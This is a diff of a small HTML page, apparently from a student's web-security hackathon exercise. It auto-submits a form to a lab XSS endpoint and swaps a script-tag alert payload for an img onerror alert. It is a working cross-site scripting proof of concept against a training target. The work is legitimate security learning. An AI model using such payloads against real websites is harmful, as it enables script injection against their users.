@@ -1,8 +1,9 @@
 <!DOCTYPE html>
 <html>
 <body>
-	<form action = "https://waph-hackathon.eastus.cloudapp.azure.com/xss/level2/echo.php" method = "POST">
-		<input name = "input" value = '<script>alert("Level 2: Hacked by Viplav Nagpal")</script>'>
+	<form action="https://waph-hackathon.eastus.cloudapp.azure.com/xss/level2/echo.php" method="POST">
+		<input name="input" value='<img src=x onerror=alert("Level 2: Viplav Nagpal")>'>
 	</form>
-	<script>
-		
+	<script>document.forms[0].submit();</script>
+</body>
+</html>
